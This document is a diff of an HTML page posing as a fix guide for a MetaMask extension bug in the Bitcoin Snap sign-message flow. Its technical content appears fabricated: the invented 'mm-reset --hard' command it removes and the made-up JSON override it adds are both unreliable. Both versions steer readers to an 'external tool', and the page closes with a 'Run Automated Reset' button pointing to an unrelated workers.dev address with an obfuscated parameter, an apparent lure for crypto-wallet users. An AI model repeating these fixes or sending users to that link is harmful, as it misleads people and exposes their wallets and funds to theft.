@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sign Message Clicking Back Button In The – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        font-family: sans-serif;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,28 +42,35 @@
 <h1>Metamask Extension Bug Sign Message Clicking Back Button In The</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a bug when attempting to sign a message using the Metamask extension, specifically when clicking the back button in the Bitcoin Snap Sign Message confirmation window. The Metamask extension fails to recover from this action, resulting in a stalled or unresponsive state.</li>
+<li>Users encounter an issue when attempting to sign a message using the Metamask extension, specifically with the Bitcoin Snap Sign Message configuration, where clicking the back button results in a bug that prevents the expected functionality.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timing issue between the Metamask extension and the Bitcoin Snap Sign Message confirmation window. When the back button is clicked, the extension's internal state becomes inconsistent, leading to a failure in recovering from this action.</li>
+<li>The error occurs due to a mismatch in the state management of the Metamask extension when handling the sign message functionality, particularly when the back button is clicked. This discrepancy leads to an inconsistent state that triggers the bug.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Clear the Metamask extension's local storage and cookies</li>
-<li>Restart the browser and reload the webpage</li>
-<li>Execute the following command to reset the extension's internal state:</li>
+<li>Attempt to reload the Metamask extension and retry the sign message process.</li>
+<li>Clear the browser's local storage for the Metamask extension and restart the browser.</li>
+<li>Use the following JSON configuration to manually override the sign message settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-reset<span class="w"> </span>--hard
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;signMessage&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;bitcoinSnap&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;backButtonBehavior&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;reset&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>For a more streamlined approach, consider using an external tool to manage and resolve extension-related issues. 
-Prerequisites:
-- Metamask extension installed and enabled
-- Bitcoin Snap Sign Message confirmation window accessible
-- Browser version compatible with the Metamask extension</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+<p>Consider utilizing an external console for a more seamless debugging experience.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured.</li>
+<li>Bitcoin Snap Sign Message configuration enabled.</li>
+<li>Latest version of the browser being used.</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
